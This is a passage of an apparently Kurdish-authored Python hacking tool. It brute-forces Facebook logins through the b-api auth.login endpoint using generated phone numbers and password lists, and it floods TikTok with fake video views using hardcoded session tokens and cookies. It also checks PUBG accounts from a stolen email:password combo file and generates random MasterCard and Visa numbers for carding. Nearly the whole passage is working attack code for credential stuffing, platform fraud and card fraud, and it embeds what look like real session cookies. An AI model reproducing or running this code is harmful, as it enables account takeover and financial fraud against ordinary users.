							url6="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas6 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
							re = requests.get(url6,headers=head).text
							if '"secure":true,"httponly":true}]' in re:
								print(ok+r1+user+r2+pas6)
							elif 'www.facebook.com' in re:
								print(cp+r1+user+r2+pas6)



							else:
								url7="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +user + "&locale=en_US&password="+ pas7 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
								re = requests.get(url7,headers=head).text
								if '"secure":true,"httponly":true}]' in re:
									print(ok+r1+user+r2+pas7)
								elif 'www.facebook.com' in re:
									print(cp+r1+user+r2+pas7)
								
								
								
								else:
									print(no+r1+user+r2+pk)

###################################################################################################################################################
def get_id_vedio():
        headers_id = {
                'Connection': 'close',
                'Pragma': 'no-cache',
                'Cache-Control': 'no-cache',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': 'tt_webid_v2=6940688826462406145; tt_webid=6940688826462406145; ttwid=1%7Cbza8rvLOfNRPRwC43Zn3utwgngykYIkkhCtiFchZVMA%7C1616005073%7C1dd5efed4a61e4b1654f08f10a6ff7b85e3d57622a4d6011f6642b1bbf785fcb; passport_csrf_token=bb82884d8da300de0ce4f8508694e635; passport_csrf_token_default=bb82884d8da300de0ce4f8508694e635; store-country-code=sa; tta_attr_id=0.1616499265.6942811476331593729; store-idc=alisg; sid_guard=5c3ba51706c6f27ef59bb4fcaf0d282b%7C1617813999%7C5184000%7CSun%2C+06-Jun-2021+16%3A46%3A39+GMT; uid_tt=9896d319adfbb4f4f7a56b2122e84ef36354da5b7a766c3d93f08771723b2e3f; uid_tt_ss=9896d319adfbb4f4f7a56b2122e84ef36354da5b7a766c3d93f08771723b2e3f; sid_tt=5c3ba51706c6f27ef59bb4fcaf0d282b; sessionid=5c3ba51706c6f27ef59bb4fcaf0d282b; sessionid_ss=5c3ba51706c6f27ef59bb4fcaf0d282b; odin_tt=530994ec29b8076689f2e696e07f7968d74abe62dc6990364400b7b666b98e83afe2d12f34a5c717c851ce41d2368908d1f4c45a8c3974fb4230088b6d230969a128029a783f0ae00352b0d06fa62e0a; R6kq3TV7=AMgpub14AQAASGoycNrCjOkGEeZn3OSfPJcGlZpRyawc4vVW0_K5JN1ScBmQ|1|0|427184ccd78b46f2f1443048844aba7bf6064745; cmpl_token=AgQQAPO_F-RMpY4vzNb-op0_-jPehXJPv4M0YPgasw; tt_csrf_token=Ev5Kwld907oqGN2T1k0HrHWF; ak_bmsc=ED95FE19720A8F91CACBCE8408BFC78E56335E9519250000BF887260FE32B047~pl7zsPkhgfEfP2YwW3Ph6y02EtVXax7QH9oUN1eMfTdDnvOlFJcDXESyLLkFAXRIaueH2qItg4EdfKBI5loXsbdYeZAAy2oCOz7PNDhyQvstusWjR1M6xBMzpFKRcIXuEXMwtrfBx4nQLynJxNr7CJOOKb02W/y1LENhAnX2p+eHB4S6HL5PRUVaJXx6xqRPtjaFzenP3I/+Wx44jRsDjDNlxmlM7krZQs+TzdJApyqZ4=; bm_sz=F1634B2D883BE7F7F8E55AF4D48798F6~YAAQlV4zViahf3R4AQAAIitmvwtx/krEk+BEEQt4CoGeEB0X2JTHtZKLSBFVXxGgh8oLe8VcsrGqbUWhtO2eK/fhU6tdNs4C36OkPBJt7HlGRC07i6coxuZO1bcf0pxWJoJppYUoC9vPHQYh1++jflOXTPVSS0hw/W++SqiceRZkS+Q5SWGwWgWnx6hP4VB1; bm_sv=5AF097FF6E9C14E8BF077EE5BD7D126D~LBiUQfj1jYvhXvESNmEdfPzQcX6s8MGsQ79mJvSVV/OclkEWqotEPinlq8GADZ+tDMWTfCrS+nQ/dH0mG7bwj0L/5a8LC5sn4KJC+CEzqxHnt2JcMCSmRrYV5vO6sJDXY01ZEpWWSdJTGeCbBD7l2DPIFidy9J5ujWVeVBBbY6I=; _abck=494D5CEEE963A444A9BFED1397AE4A1A~-1~YAAQl14zVjHK03V4AQAAfJRovwV3ujEp8mNTnNKx5q6XhLXbDZgBUZwYi8ZS6N3zYCWz6lpsDgFzXfDQT7dKaxDyijowI/MIW0aLuDCIUFU5bw1xBMaKFv4tvXv8QfiThLmgZh3ihOCUJ9xBvVcf9Aw3OQ0YIpDK7oCidJ7WeQkT5jGIhm9yXvB6zUde3/xrOzZyDyxLO6qbSuunOwTmgGN/+qoNcrE82ZJDp3faWXgLMEtgi22ui9gENAV5rnlzEZll3e8AZMn9xZbq+9Aa7SAtgmih3i4WTgyPxwR7DXjPNZ+pnnAb/qJ+JCI+TFIiRW31KVuqy0A6142qz3Whm+XM++sQIWOuThkmXtEh25NeYtyKV3LwWDHMPg7sICqWEjOtgCLPh4lUxLpZaroVbcn0hnVZQ/ab~0~-1~-'
        }
        print('\x1b[1;97m linke post dabne ')
        link_id = input('\x1b[1;97m Link Post:\033[32m ')
        print(' View \033[32m1,9999 ' )
        Thread = int(input('\x1b[1;97m View: \033[32m'))
        try:
                req_id = requests.get(link_id, headers=headers_id).text
                id_post1 = re.findall('"video":{"id":"(.*?)"', req_id)
                id_post = "".join(id_post1)
                print('[+] Get Post ..')
        except:
                print('[-] Not Found Post..')
                print('')
                get_id_vedio()
        def View():
                url_view = 'https://api16-core-c-alisg.tiktokv.com/aweme/v1/aweme/stats/?ac=WIFI&op_region=SA'
                headers_view = {
                        'Host': 'api16-core-c-alisg.tiktokv.com',
                        'Content-Length': '138',
                        'Sdk-Version': '2',
                        'Passport-Sdk-Version': '5.12.1',
                        'X-Tt-Token': '01de097c7d0877a06067897aabb4bf27970263ef2c096122cc1a97dec9cd12a6c75d81d3994668adfbb3ffca278855dd15c8056ad18161b26379bbf95d25d1f065abd5dd3a812f149ca11cf57e4b85ebac39d - 1.0.0',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'TikTok 17.4.0 rv:174014 (iPhone; iOS 14.2; ar_SA@calendar=gregorian) Cronet',
                        'X-Ss-Stub': '727D102356930EE8C1F61B112F038D96',
                        'X-Tt-Store-Idc': 'alisg',
                        'X-Tt-Store-Region': 'sa',
                        'X-Ss-Dp': '1233',
                        'X-Tt-Trace-Id': '00-33c8a619105fd09f13b65546057d04d1-33c8a619105fd09f-01',
                        'Accept-Encoding': 'gzip, deflate',
                        'X-Khronos': '1620071457',
                        'X-Gorgon': '840280416000d88c456af519b3652ea63974e294429b0041db20',
                        'X-Common-Params-V2': 'pass-region=1&pass-route=1&language=ar&version_code=17.4.0&app_name=musical_ly&vid=0F62BF08-8AD6-4A4D-A870-C098F5538A97&app_version=17.4.0&carrier_region=SA&channel=App%20Store&mcc_mnc=42001&device_id=6904193135771207173&tz_offset=10800&account_region=&sys_region=SA&aid=1233&residence=SA&screen_width=1125&uoo=1&openudid=c0c519b4e8148dec69410df9354e6035aa155095&os_api=18&os_version=14.2&app_language=ar&tz_name=Asia/Riyadh&current_region=SA&device_platform=iphone&build_number=174014&device_type=iPhone10,6&iid=6958149070179878658&idfa=00000000-0000-0000-0000-000000000000&locale=ar&cdid=D1D404AE-ABDF-4973-983C-CC723EA69906&content_language=',
                        'Connection': 'close'
                }
                cookie_view = {'sessionid': 'de097c7d0877a06067897aabb4bf2797'}
                data_view = f'action_time=1620071984&aweme_type=0&first_install_time=1607507898&item_id={id_post}&play_delta=1&tab_type=4'
                dan = 0
                while True:
                        req_explore = requests.post(url_view, data=data_view, headers=headers_view,cookies=cookie_view).text
                        dan+=1
                        if ('"status_code":0') in req_explore:
                                print('\033[32m['+str(dan)+'] View consign post tiktok')
                        else:
                                print('\033[31m['+str(dan)+'] View consign post tiktok')
        import threading
        Threads = []
        for i in range(Thread):
                thread1 = threading.Thread(target=View)
                thread1.start()
                Threads.append(thread1)
        for thread2 in Threads:
                thread2.join()


###################################################################################################################################################


headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
[✓] Hacked BY DRAG0N PUBG :
[✓] Email: {eml}
[✓] Pass: {pas}
━━━━━━━━━━━━━"""
  NO = f"""
[-] NOT Hacked PUBG :
[-] Email: {eml}
[-] Pass: {pas}
━━━━━━━━━━━━━"""
  r = requests
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    
  else:
    import os
def FILname():
  F = input('[+] Enter combo file : ')
  print(logo2)
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrect !\n')
    return FILname()

###################################################################################################################################################
def numr():
	kock = open(".save/fb.txt","w")
	for wwe in range(2000):
		x="12345678900987654321"
		x1=random.choice(x)
		x2=random.choice(x)
		x3=random.choice(x)
		x4=random.choice(x)
		x5=random.choice(x)
		x6=random.choice(x)
		x7=random.choice(x)
		xoe =x1+x2+x3+x4+x5+x6+x7
		kock.write(xoe+"\n")


def fb_old():
	os.system('clear')
	numr()
	print(logo)
	print(logo2)
	print(num)
	ac = input('\x1b[1;97m Number: ')
	lk(' all line fb.txt')
	lk(' Crack Faecbook-Old')
	print('==========================================================')
	ph = open("fb.txt","r").readlines()
	for dek in ph:
		u = dek.strip()
		pas1 = u
		user = '+964'+ac+u
		
		url="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password="+ pas1 + "&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		re = requests.get(url,headers=head).text
		
		if '"secure":true,"httponly":true}]' in re:
			print(ok+r1+user+r2+pas1)
		else:
			print(no+r1+user+r2+pas1)
	fb_old()


##########################################################
def cart():
	os.system('clear')
	print(logo)
	print(logo2)
	print('\n \x1b[1;97mMasterCart > 5396390 , 512119 '+'\n'+' \x1b[1;97mVisaCart > 439129 , 489504 \n ')
	print(logo2)
	djk=input(' \x1b[90;1mcode Cart --> ')
	lk(' Crack cart '+djk)
	lk(' time...')
	print(logo2)
	time.sleep(0.9)
	df='|02|' , '|11|' , '|12|' , '|05|' , '|09|' , '|06|' , '|03|' , '|08|'
	a = '5396390' , '5396393' , '5396392'
	hh = '2023|' , '2027|' , '2025|' , '2024|'
	op=open(".txt","w")
	cik = 0
	efb = 0
	for x in range(40):
		f = '123456'
		f1 = '1' , '2' , '3' , '4' , '5' , '6' , '7' , '8' , '9' , '0'
		x0=' '
		x1 = djk
		x2 = random.choice(f)
		x3 = random.choice(f)
		x4 = random.choice(f)
		x5 = random.choice(f)
		x6 = random.choice(f)
		x7 = random.choice(f)
		x8 = random.choice(f)
		x9 = random.choice(f)
		x10 = random.choice(f)
		x11 = random.choice(f)
		x22 = random.choice(df)
		x23 = random.choice(hh)
		x24 = random.choice(f1)
		x25 = random.choice(f1)
		x26 = random.choice(f1)
		dd = x0+x1+x2+x3+x4+x5+x6+x7+x8+x9+x10+x11+x22+x23+x24+x25+x26
		cik+=1
		efb+=1
		if efb==4:
			time.sleep(0.4)
			print('    ')
			efb=0
		print('\033[32m'+dd)
		time.sleep(0.2)
	print('\n')
	time.sleep(0.5)
	print (logo2+'\n')
	print('\x1b[1;97m crack bo '+str(cik))
	print('\n\x1b[1;97m [\033[32m1\x1b[1\x1b[1;97m] Bo pshknene cart [live]'+'\n')
	print('\x1b[1;97m [2] Dast Pekrdnawa'+'\n')
	dw()
def dw():
	fg=input('-------> ')
	if fg=='100':
		print('gobxo')
	elif fg=='1':
		os.system('xdg-open https://www.mrchecker.net/card/ccn2')
		dw()
	elif fg=='2':
		cart()


#######################################################################################################################################



if __name__ == '__main__':
	dast()
